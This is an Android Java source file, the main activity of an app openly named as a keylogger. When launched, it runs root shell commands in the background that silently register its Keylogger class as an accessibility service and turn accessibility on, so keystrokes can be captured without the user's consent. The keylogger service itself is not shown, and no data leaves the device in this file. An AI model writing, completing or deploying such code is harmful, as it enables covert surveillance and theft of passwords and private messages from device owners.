package com.none.keylogger;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.os.AsyncTask;
import android.os.Looper;
import android.util.Log;
import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    // Startup method to run keylogger as an accessibility task
    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // background task method

            // uses root to enable accessibility setting

            enableAccessibility();
            return null;
        }
    }

    // on create is what is run when the application is run
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // run startup Task to enable accessibilty option
        (new Startup()).execute();
    }

    // method to run keylogger
    void enableAccessibility(){

        Log.d("MainActivity", "enableAccessibility");

        // Check if running on the main thread
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.d("MainActivity", "on main thread");
        } else { // on another thread
            Log.d("MainActivity", "not on main thread");
            try {
                // try to run super user
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                // write to root terminal, enable Keylogger as accessibility service
                os.writeBytes("settings put secure enabled_accessibility_services com.none.keylogger/com.none.keylogger.Keylogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();

                process.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}
